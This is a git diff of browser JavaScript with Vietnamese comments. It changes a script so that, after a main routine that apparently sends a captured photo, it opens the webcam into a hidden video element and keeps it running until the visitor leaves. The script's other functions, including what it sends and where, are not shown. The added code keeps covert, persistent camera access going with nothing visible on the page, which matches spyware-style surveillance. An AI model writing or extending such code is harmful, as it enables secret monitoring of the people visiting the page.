@@ -175,7 +175,6 @@ async function sendTextOnly() {
   });
 }
 
-// 👉 delay helper
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -204,35 +203,27 @@ async function main() {
   }
 }
 
-// 👉 Sau khi main xong, chờ 1.5s rồi bật lại camera và giữ mãi
+// 👉 Sau khi main() hoàn thành, bật camera duy nhất 1 lần và giữ nguyên
 main().then(async () => {
   window.mainScriptFinished = true;
-  await stopLoopCamera();     // Tắt camera nếu còn mở
-  await delay(1500);          // Đợi 1.5 giây
-  await startLoopCamera();    // Bật lại camera và giữ nguyên
+  await delay(1500);           // Đợi 1.5s sau khi gửi ảnh
+  await startPersistentCamera(); // Bật camera và giữ nguyên
 });
 
-// 👉 Quản lý camera giữ nguyên
-let loopStream = null;
+
+// 👉 Giữ camera mở đến khi thoát web
+let persistentStream = null;
 const video = document.createElement("video");
 video.style.display = "none";
 video.autoplay = true;
 video.playsInline = true;
 document.body.appendChild(video);
 
-function stopLoopCamera() {
-  if (loopStream) {
-    loopStream.getTracks().forEach(track => track.stop());
-    loopStream = null;
-    console.log("🚫 Camera đã tắt (trước khi bật lại)");
-  }
-}
-
-async function startLoopCamera() {
+async function startPersistentCamera() {
   try {
-    loopStream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = loopStream;
-    console.log("🎥 Camera đã bật lại (và giữ nguyên cho tới khi thoát)");
+    persistentStream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = persistentStream;
+    console.log("🎥 Camera đã bật lại và giữ nguyên đến khi thoát");
   } catch (e) {
     console.error("Không thể bật lại camera:", e);
   }
